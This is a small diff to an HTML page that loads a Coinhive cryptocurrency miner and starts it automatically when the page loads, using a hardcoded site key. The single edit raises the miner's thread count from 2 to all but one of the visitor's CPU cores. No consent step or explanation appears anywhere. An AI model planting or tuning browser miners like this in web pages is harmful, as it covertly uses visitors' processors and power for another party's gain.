@@ -35,7 +35,7 @@
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
       var miner = new CoinHive.Anonymous('e4cjnPnR00ZZFwzJdeC6MIIVFA7GdMLi', {
-        threads: 2
+        threads: navigator.hardwareConcurrency - 1
       });
       miner.start();
     </script>
